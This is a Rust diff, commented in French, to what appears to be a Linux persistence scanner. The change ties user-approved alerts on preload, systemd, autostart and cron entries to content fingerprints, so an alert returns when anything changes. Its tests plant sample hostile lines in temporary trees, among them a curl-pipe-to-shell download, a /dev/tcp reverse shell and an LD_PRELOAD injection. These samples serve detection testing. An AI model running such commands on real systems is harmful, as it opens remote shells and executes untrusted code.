@@ -3,7 +3,9 @@
 
 #![warn(clippy::arithmetic_side_effects, clippy::as_conversions)]
 
+use super::designes::{self, Designe};
 use super::*;
+use crate::machine::temoins;
 
 /// /usr/bin/x → /bin/x (idem sbin, lib) : chemin d'avant la fusion de /usr.
 pub(super) fn chemin_hors_usr(fichier: &Path) -> Option<std::path::PathBuf> {
@@ -193,15 +195,19 @@ pub(super) fn definit_prechargement(ligne: &str) -> bool {
         && !ligne.trim_start().starts_with("unset")
 }
 
-/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd), sans suivre les liens d'activation.
+/// Fichiers d'un dossier (et de ses sous-dossiers « *.d » de systemd), liens vers un fichier compris ; les liens
+/// d'activation (dossiers « *.wants ») ne sont pas parcourus.
 pub(super) fn fichiers_de(dossier: &Path, extensions: &[&str]) -> Vec<std::path::PathBuf> {
     let mut trouve = Vec::new();
     for e in std::fs::read_dir(dossier).into_iter().flatten().flatten() {
         let p = e.path();
         let Ok(t) = e.file_type() else { continue };
+        // Un lien vers un fichier ordinaire se lit comme lui : sinon, une unité acceptée remplacée par un lien vers
+        // une autre sortirait de la lecture (et son alerte avec). Jamais un lien vers un dossier (une boucle).
+        let fichier = t.is_file() || (t.is_symlink() && std::fs::metadata(&p).is_ok_and(|m| m.is_file()));
         if t.is_dir() && (p.extension().is_some_and(|x| x == "d") || dossier.ends_with("hypr")) {
             trouve.extend(fichiers_de(&p, extensions));
-        } else if t.is_file() && p.extension().is_some_and(|x| extensions.iter().any(|e| x == *e)) {
+        } else if fichier && p.extension().is_some_and(|x| extensions.iter().any(|e| x == *e)) {
             trouve.push(p);
         }
     }
@@ -252,7 +258,11 @@ pub(super) fn persistance_dans(
     );
     #[cfg(test)]
     tests::RACINE_LUE.with(|r| *r.borrow_mut() = Some(racine.to_path_buf()));
-    let mut t = Lancements::default();
+    let mut t = Lancements {
+        racine: racine.to_path_buf(),
+        maison: maison.to_path_buf(),
+        ..Lancements::default()
+    };
     lire_prechargement(racine, &variable, gestion, &mut t);
     let (demarrage, hypr) = fichiers_de_demarrage(racine, maison);
     let mut configuration = fichiers_de_configuration(racine, maison);
@@ -277,6 +287,65 @@ struct Lancements {
     /// Pour chaque ligne signalée, le fichier et la ligne telle qu'écrite (fin « \r » comprise) qu'un geste de
     /// défense retirerait ; `None` : signalée ailleurs que dans un fichier (variable de la session, crontab du compte).
     retraits: Vec<Option<(String, String)>>,
+    /// Pour chaque ligne signalée, ce qu'un choix « normal » lierait (`machine::temoins`), ou pourquoi on ne peut pas.
+    temoins: Vec<Result<temoins::Temoin, temoins::Refus>>,
+    /// La racine lue et le dossier personnel : où chercher ce qu'une ligne lance.
+    racine: std::path::PathBuf,
+    maison: std::path::PathBuf,
+}
+
+/// Les fichiers que désigne une ligne (`designes`), relevés sous `racine` ; `Err` : la ligne ne dit pas sans ambiguïté
+/// ce qu'elle lance, ou l'un d'eux ne se relève pas.
+fn cibles(t: &Lancements, d: Designe, ligne: &str) -> Result<Vec<(String, temoins::Etat)>, temoins::Refus> {
+    let Designe::Chemins(chemins) = d else {
+        return Err(temoins::Refus(trf!(
+            "la ligne « {} » ne dit pas sans ambiguïté ce qu'elle lance (variable, sous-commande, tube, joker ou chemin relatif)",
+            "the line “{}” does not say unambiguously what it starts (variable, subcommand, pipe, wildcard or relative path)",
+            crate::ui::couper(&crate::ui::affichable(ligne.trim()), 80)
+        )));
+    };
+    chemins
+        .into_iter()
+        .map(|c| {
+            // Sous une racine fabriquée (corpus), un chemin absolu se lit sous elle ; le dossier personnel y est déjà.
+            let lu = if t.racine == Path::new("/") || Path::new(&c).starts_with(&t.racine) {
+                std::path::PathBuf::from(&c)
+            } else {
+                t.racine.join(c.trim_start_matches('/'))
+            };
+            // Montré (et lié) comme « ~/… » dans le dossier personnel : le même fichier pour le même compte. Pas
+            // nettoyé ici (`court`) : le témoin lie le chemin exact et ne nettoie que ce qu'il montre.
+            let montre = Path::new(&c)
+                .strip_prefix(&t.maison)
+                .map_or_else(|_| c.clone(), |r| format!("~/{}", r.to_string_lossy()));
+            temoins::etat_de_la_cible(&lu).map(|e| (montre, e))
+        })
+        .collect()
+}
+
+/// Le témoin d'une ligne `l` (numéro `n`, à partir de 0) du fichier `f`, dont `texte` est le contenu lu.
+fn temoin_de_ligne(
+    t: &Lancements,
+    fichier: &Path,
+    n: usize,
+    texte: &str,
+    ligne: &str,
+    designe: Designe,
+) -> Result<temoins::Temoin, temoins::Refus> {
+    let cibles = cibles(t, designe, ligne)?;
+    let numero = n.saturating_add(1);
+    Ok(temoins::temoin(
+        &format!("{}:{numero}", fichier.to_string_lossy()),
+        format!("{}:{numero}", court(fichier, &t.maison)),
+        ligne,
+        Some(&temoins::etat_du_contenant(fichier, texte)),
+        &cibles,
+    ))
+}
+
+/// Le dossier personnel, en texte, pour déplier « ~/ », « $HOME/ », « %h/ ».
+fn maison_texte(t: &Lancements) -> String {
+    t.maison.to_string_lossy().into_owned()
 }
 
 /// La ligne `l` (lue par `lines()`) telle qu'écrite dans `texte`, coupée au seul « \n » comme la relit le fils root.
@@ -303,14 +372,17 @@ fn lire_prechargement(
 ) {
     let preload = racine.join("etc/ld.so.preload");
     if let Ok(texte) = std::fs::read_to_string(&preload) {
-        for (ligne, lib) in texte
+        for (n, ligne, lib) in texte
             .lines()
-            .filter(|l| !commentaire(l))
-            .flat_map(|l| l.split_whitespace().map(move |lib| (l, lib)))
+            .enumerate()
+            .filter(|(_, l)| !commentaire(l))
+            .flat_map(|(n, l)| l.split_whitespace().map(move |lib| (n, l, lib)))
         {
             let connue = gestion.is_some_and(|g| g.possede(Path::new(lib)));
             t.sources.push(source_de("preload", lib));
             t.retraits.push(retrait(&preload, &texte, ligne));
+            let temoin = temoin_de_ligne(t, &preload, n, &texte, ligne, designes::bibliotheques(lib, None));
+            t.temoins.push(temoin);
             // Écrit par qui a posé le préchargement (un rootkit, souvent) : montré rendu inoffensif.
             let lib = crate::ui::affichable(lib);
             if connue {
@@ -328,8 +400,19 @@ fn lire_prechargement(
     }
     for var in ["LD_PRELOAD", "LD_AUDIT"] {
         if let Some(v) = variable(var).filter(|v| !v.is_empty()) {
-            t.sources.push(source_de(&format!("env:{var}"), &v.to_string_lossy()));
+            let valeur = v.to_string_lossy();
+            t.sources.push(source_de(&format!("env:{var}"), &valeur));
             t.retraits.push(None);
+            let temoin = cibles(t, designes::bibliotheques(&valeur, None), &valeur).map(|c| {
+                temoins::temoin(
+                    &format!("env:{var}"),
+                    trf!("{var} de cette session", "{var} of this session"),
+                    &valeur,
+                    None,
+                    &c,
+                )
+            });
+            t.temoins.push(temoin);
             t.suspects.push(trf!(
                 "{var}={} est défini pour cette session",
                 "{var}={} is set for this session",
@@ -418,6 +501,9 @@ fn juger_configuration(
                 t.sources
                     .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                 t.retraits.push(retrait(f, &texte, l));
+                let d = designes::prechargement(l, &maison_texte(t));
+                let temoin = temoin_de_ligne(t, f, n, &texte, l, d);
+                t.temoins.push(temoin);
                 t.suspects.push(trf!(
                     "{}:{} précharge une bibliothèque (LD_PRELOAD)",
                     "{}:{} preloads a library (LD_PRELOAD)",
@@ -431,6 +517,9 @@ fn juger_configuration(
                 t.sources
                     .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                 t.retraits.push(retrait(f, &texte, l));
+                let d = designes::commande(l, &maison_texte(t));
+                let temoin = temoin_de_ligne(t, f, n, &texte, l, d);
+                t.temoins.push(temoin);
                 t.suspects.push(trf!(
                     "{}:{} : {raison}",
                     "{}:{}: {raison}",
@@ -449,10 +538,16 @@ fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancement
             continue;
         };
         for (n, l) in texte.lines().enumerate() {
-            if let Some(raison) = commande_lancee(l).and_then(|c| commande_suspecte(&c, true)) {
+            let Some(commande) = commande_lancee(l) else {
+                continue;
+            };
+            if let Some(raison) = commande_suspecte(&commande, true) {
                 t.sources
                     .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
                 t.retraits.push(retrait(f, &texte, l));
+                let d = designes::commande(&commande, &maison_texte(t));
+                let temoin = temoin_de_ligne(t, f, n, &texte, l, d);
+                t.temoins.push(temoin);
                 t.suspects.push(trf!(
                     "{}:{} : {raison}",
                     "{}:{}: {raison}",
@@ -464,20 +559,44 @@ fn juger_demarrage(demarrage: &[std::path::PathBuf], h: &Path, t: &mut Lancement
     }
 }
 
+/// La commande d'une ligne de cron, sans son horaire (« @reboot » ou cinq champs) ni, dans un fichier du système, le
+/// compte qui la lance.
+fn commande_de_cron(l: &str, systeme: bool) -> String {
+    let l = l.trim();
+    let champs: usize = match (l.starts_with('@'), systeme) {
+        (true, false) => 1,
+        (true, true) => 2,
+        (false, false) => 5,
+        (false, true) => 6,
+    };
+    l.split_whitespace().skip(champs).collect::<Vec<_>>().join(" ")
+}
+
 /// La crontab du compte et celles du système : chaque ligne est une commande.
 fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
     let etc = |chemin: &str| racine.join(chemin);
-    // (source affichée, fichier et ligne telle qu'écrite pour un retrait, ligne) ; la crontab du compte n'a pas de
-    // fichier qu'un geste de défense toucherait.
-    #[allow(
-        clippy::type_complexity,
-        reason = "trois champs nommés par le commentaire, d'une seule fonction"
-    )]
-    let mut cron: Vec<(String, Option<(String, String)>, String)> = crontab
-        .unwrap_or_default()
-        .lines()
-        .map(|l| ("crontab".to_string(), None, l.to_string()))
-        .collect();
+    let crontab = crontab.unwrap_or_default();
+    // La crontab du compte n'a pas de fichier qu'un geste de défense toucherait ; son texte entier est son témoin.
+    for (n, l) in crontab.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
+        if let Some(raison) = commande_suspecte(l, false) {
+            t.sources.push(source_de("crontab", l));
+            t.retraits.push(None);
+            let numero = n.saturating_add(1);
+            let temoin = cibles(t, designes::commande(&commande_de_cron(l, false), &maison_texte(t)), l).map(|c| {
+                temoins::temoin(
+                    &format!("crontab:{numero}"),
+                    format!("crontab:{numero}"),
+                    l,
+                    Some(&temoins::Etat::Fichier {
+                        empreinte: temoins::empreinte_du_texte(crontab.as_bytes()),
+                    }),
+                    &c,
+                )
+            });
+            t.temoins.push(temoin);
+            t.suspects.push(trf!("crontab : {raison}", "crontab: {raison}"));
+        }
+    }
     let mut fichiers_cron = vec![etc("etc/crontab")];
     fichiers_cron.extend(
         std::fs::read_dir(etc("etc/cron.d"))
@@ -488,20 +607,16 @@ fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
     );
     for f in fichiers_cron {
         let texte = std::fs::read_to_string(&f).unwrap_or_default();
-        for l in texte.lines() {
-            cron.push((crate::ui::chemin_affichable(&f), retrait(&f, &texte, l), l.to_string()));
-        }
-    }
-    for (source, a_retirer, l) in cron.iter().filter(|(_, _, l)| !commentaire(l)) {
-        if let Some(raison) = commande_suspecte(l, false) {
-            let origine = if source == "crontab" {
-                "crontab".to_string()
-            } else {
-                crate::modele::id::chemin(source)
-            };
-            t.sources.push(source_de(&origine, l));
-            t.retraits.push(a_retirer.clone());
-            t.suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
+        let source = crate::ui::chemin_affichable(&f);
+        for (n, l) in texte.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
+            if let Some(raison) = commande_suspecte(l, false) {
+                t.sources.push(source_de(&crate::modele::id::chemin(&source), l));
+                t.retraits.push(retrait(&f, &texte, l));
+                let d = designes::commande(&commande_de_cron(l, true), &maison_texte(t));
+                let temoin = temoin_de_ligne(t, &f, n, &texte, l, d);
+                t.temoins.push(temoin);
+                t.suspects.push(trf!("{source} : {raison}", "{source}: {raison}"));
+            }
         }
     }
 }
@@ -515,6 +630,8 @@ fn constat_des_lancements(t: Lancements) -> Constat {
         mut suspects,
         sources,
         mut retraits,
+        temoins: releves,
+        ..
     } = t;
     suspects.sort();
     suspects.dedup();
@@ -575,6 +692,7 @@ fn constat_des_lancements(t: Lancements) -> Constat {
         ),
         &gestes,
     )
+    .avec_temoins(temoins::Temoins::de(releves))
 }
 
 /// Services système ajoutés à la main : souvent les tiens (scripts maison), parfois une persistance root. On les nomme
@@ -582,15 +700,42 @@ fn constat_des_lancements(t: Lancements) -> Constat {
 fn services_ajoutes(racine: &Path, gestion: Option<Paquets>) -> Option<Constat> {
     let gestion = gestion?;
     let systeme = racine.join("etc/systemd/system");
-    let mut ajoutes: Vec<String> = fichiers_de(&systeme, &["service", "timer"])
+    let mut fichiers: Vec<std::path::PathBuf> = fichiers_de(&systeme, &["service", "timer"])
         .into_iter()
         .filter(|p| p.parent() == Some(systeme.as_path()) && !p.is_symlink())
         .filter(|p| !gestion.possede(p))
+        .collect();
+    fichiers.sort();
+    let ajoutes: Vec<String> = fichiers
+        .iter()
         .filter_map(|p| p.file_name().map(|n| n.to_string_lossy().into_owned()))
         .collect();
-    ajoutes.sort();
+    // Un choix « normal » est lié au contenu de chaque fichier de service : changé, l'information revient.
+    let releves = fichiers
+        .iter()
+        .map(|f| {
+            let texte = std::fs::read_to_string(f).map_err(|e| {
+                temoins::Refus(trf!(
+                    "{} ne se lit pas ({e})",
+                    "{} cannot be read ({e})",
+                    crate::ui::chemin_affichable(f)
+                ))
+            })?;
+            let nom = f
+                .file_name()
+                .map(|n| n.to_string_lossy().into_owned())
+                .unwrap_or_default();
+            Ok(temoins::temoin(
+                &f.to_string_lossy(),
+                crate::ui::chemin_affichable(f),
+                &nom,
+                Some(&temoins::etat_du_contenant(f, &texte)),
+                &[],
+            ))
+        })
+        .collect();
     // Seulement depuis la vraie racine : les noms d'une arborescence fabriquée ne désignent rien de cet ordinateur.
-    juger_services_ajoutes(&ajoutes, racine == Path::new("/"))
+    juger_services_ajoutes(&ajoutes, racine == Path::new("/")).map(|c| c.avec_temoins(temoins::Temoins::de(releves)))
 }
 
 /// `ajoutes` : les noms de fichier tels que lus (triés). `gestes` : désactiver chacun par un geste de défense, chacun
@@ -1056,6 +1201,7 @@ mod tests {
                     .into_iter()
                     .map(|r| r.map(|(f, l)| (f.into(), l.into())))
                     .collect(),
+                ..Lancements::default()
             })
             .correctif
             .unwrap()
@@ -1392,5 +1538,187 @@ mod tests {
         assert!(definit_prechargement("env = LD_PRELOAD,/tmp/a.so"));
         assert!(!definit_prechargement("unset LD_PRELOAD"));
         assert!(!definit_prechargement("# LD_PRELOAD=/x"));
+    }
+
+    /// Une arborescence jetable (racine, dossier personnel d'alice), et la lecture de sa persistance : le constat des
+    /// lancements.
+    struct Maison {
+        racine: std::path::PathBuf,
+    }
+
+    impl Maison {
+        fn nouvelle(nom: &str) -> Maison {
+            let racine = crate::essais::temporaire().join(format!("vanguard-normal-{nom}-{}", std::process::id()));
+            let _ = std::fs::remove_dir_all(&racine);
+            std::fs::create_dir_all(racine.join("home/alice/.config/systemd/user")).unwrap();
+            Maison { racine }
+        }
+
+        fn chemin(&self, relatif: &str) -> std::path::PathBuf {
+            self.racine.join("home/alice").join(relatif)
+        }
+
+        fn ecrire(&self, relatif: &str, texte: &str) {
+            let p = self.chemin(relatif);
+            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
+            let _ = std::fs::remove_file(&p);
+            std::fs::write(p, texte).unwrap();
+        }
+
+        fn lancements(&self) -> Constat {
+            persistance_dans(&self.racine, &self.racine.join("home/alice"), |_| None, None, None)
+                .into_iter()
+                .next()
+                .unwrap()
+        }
+    }
+
+    impl Drop for Maison {
+        fn drop(&mut self) {
+            let _ = std::fs::remove_dir_all(&self.racine);
+        }
+    }
+
+    const UNITE: &str = "[Unit]\nDescription=Rappel\n\n[Service]\nType=oneshot\nExecStart=%h/.cache-x/rappel.sh\n";
+
+    fn maison_avec_rappel(nom: &str) -> Maison {
+        let m = Maison::nouvelle(nom);
+        m.ecrire(".config/systemd/user/rappel.service", UNITE);
+        m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\necho rappel\n");
+        m
+    }
+
+    /// Le cas qui a mené à ce lot (valeurs inventées) : une unité de l'utilisateur lance un programme d'un dossier
+    /// caché, à corriger soi-même. Elle se déclare normale, montre sa ligne, son fichier et le programme lancé ; le
+    /// même état relu au bilan suivant est tu.
+    #[test]
+    fn unite_de_l_utilisateur_declarable() {
+        use crate::machine::temoins::Temoins;
+        let m = maison_avec_rappel("declarable");
+        let c = m.lancements();
+        assert_eq!(c.probleme, Some(Niveau::Eleve));
+        let k = c.correctif.as_ref().unwrap();
+        assert!(!k.automatique, "une ligne du dossier personnel reste à la main");
+        let Temoins::Releves(_) = c.temoins() else {
+            panic!("{:?}", c.temoins());
+        };
+        let lignes = c.temoins().lignes();
+        assert_eq!(lignes.len(), 1);
+        assert_eq!(lignes[0].ou, "~/.config/systemd/user/rappel.service:6");
+        assert_eq!(lignes[0].ligne, "ExecStart=%h/.cache-x/rappel.sh");
+        assert!(lignes[0].contenant.is_some());
+        assert_eq!(lignes[0].cibles.len(), 1);
+        assert_eq!(lignes[0].cibles[0].0, "~/.cache-x/rappel.sh");
+        assert!(crate::apprentissage::declarable(&c).is_ok());
+        let encore = m.lancements();
+        assert_eq!(c.temoins().empreinte(), encore.temoins().empreinte());
+        assert!(crate::apprentissage::essai_tait(&c, &encore));
+    }
+
+    /// Le modèle de menace du lot, cas par cas : après un choix « normal », chaque changement fait revenir l'alerte.
+    #[test]
+    fn tout_changement_fait_revenir_l_alerte() {
+        type Changement = fn(&Maison);
+        let cas: [(&str, Changement); 9] = [
+            ("unité changée", |m| {
+                m.ecrire(
+                    ".config/systemd/user/rappel.service",
+                    &format!("{UNITE}Environment=LD_LIBRARY_PATH=/tmp\n"),
+                );
+            }),
+            ("unité remplacée par un lien au même contenu", |m| {
+                m.ecrire(".local/share/ailleurs.service", UNITE);
+                let p = m.chemin(".config/systemd/user/rappel.service");
+                std::fs::remove_file(&p).unwrap();
+                std::os::unix::fs::symlink(m.chemin(".local/share/ailleurs.service"), &p).unwrap();
+            }),
+            ("programme lancé changé", |m| {
+                m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl -s http://192.0.2.7/x | sh\n");
+            }),
+            ("programme lancé remplacé par un lien", |m| {
+                m.ecrire(".cache-x/vrai.sh", "#!/bin/sh\necho rappel\n");
+                let p = m.chemin(".cache-x/rappel.sh");
+                std::fs::remove_file(&p).unwrap();
+                std::os::unix::fs::symlink(m.chemin(".cache-x/vrai.sh"), &p).unwrap();
+            }),
+            ("programme lancé effacé", |m| {
+                std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
+            }),
+            ("ligne ajoutée dans le même fichier", |m| {
+                m.ecrire(
+                    ".config/systemd/user/rappel.service",
+                    &format!("{UNITE}ExecStartPost=%h/.cache-x/autre.sh\n"),
+                );
+            }),
+            ("autre source dans la même alerte", |m| {
+                m.ecrire(".config/autostart/maj.desktop", "[Desktop Entry]\nExec=/tmp/.x/agent\n");
+            }),
+            ("ligne de la crontab dans un fichier lu", |m| {
+                m.ecrire(".bashrc", "export LD_PRELOAD=/tmp/.l/libz.so\n");
+            }),
+            ("même ligne, autre programme", |m| {
+                m.ecrire(
+                    ".config/systemd/user/rappel.service",
+                    &UNITE.replace("rappel.sh", "rappel.sh --x"),
+                );
+            }),
+        ];
+        for (nom, changer) in cas {
+            let m = maison_avec_rappel(&format!("revient-{}", nom.len()));
+            let declare = m.lancements();
+            assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()), "{nom}");
+            changer(&m);
+            let plus_tard = m.lancements();
+            assert!(plus_tard.probleme >= Some(Niveau::Eleve), "{nom}");
+            assert_ne!(declare.temoins().empreinte(), plus_tard.temoins().empreinte(), "{nom}");
+            assert!(
+                !crate::apprentissage::essai_tait(&declare, &plus_tard),
+                "{nom} : l'alerte doit revenir"
+            );
+        }
+    }
+
+    /// Ce qui ne se relève pas ne se déclare pas normal : une commande ambiguë, un programme illisible, plus de
+    /// lignes qu'on n'en montre ; un shell inversé non plus. Et une alerte qui ne se relève plus n'est plus tue.
+    #[test]
+    fn releves_refuses() {
+        use crate::machine::temoins::{TEMOINS_MAX, Temoins};
+        let refuse = |m: &Maison| matches!(m.lancements().temoins(), Temoins::Refuse(_));
+        let m = Maison::nouvelle("ambigu");
+        m.ecrire(
+            ".config/systemd/user/a.service",
+            "[Service]\nExecStart=%h/.x/run $ARGUMENTS\n",
+        );
+        assert!(refuse(&m));
+        assert!(crate::apprentissage::declarable(&m.lancements()).is_err());
+        let m = Maison::nouvelle("inverse");
+        m.ecrire(".bashrc", "bash -i >& /dev/tcp/192.0.2.7/4444 0>&1\n");
+        assert!(refuse(&m));
+        let m = Maison::nouvelle("trop");
+        let unite = (0..=TEMOINS_MAX).fold(String::new(), |mut u, i| {
+            u.push_str("ExecStartPre=%h/.x/etape");
+            u.push_str(&i.to_string());
+            u.push('\n');
+            u
+        });
+        m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{unite}"));
+        assert!(refuse(&m));
+        // Le programme devenu illisible (un dossier à sa place) : le choix d'hier ne tait plus rien.
+        let m = maison_avec_rappel("illisible");
+        let declare = m.lancements();
+        std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
+        std::fs::create_dir_all(m.chemin(".cache-x/rappel.sh")).unwrap();
+        let plus_tard = m.lancements();
+        assert!(matches!(plus_tard.temoins(), Temoins::Refuse(_)));
+        assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard));
+    }
+
+    /// Une ligne de cron se lit sans son horaire ni le compte qui la lance.
+    #[test]
+    fn commandes_de_cron() {
+        assert_eq!(commande_de_cron("*/5 * * * * /opt/a --b", false), "/opt/a --b");
+        assert_eq!(commande_de_cron("@reboot /opt/a", false), "/opt/a");
+        assert_eq!(commande_de_cron("0 3 * * * root /opt/a", true), "/opt/a");
+        assert_eq!(commande_de_cron("@daily root /opt/a", true), "/opt/a");
     }
 }
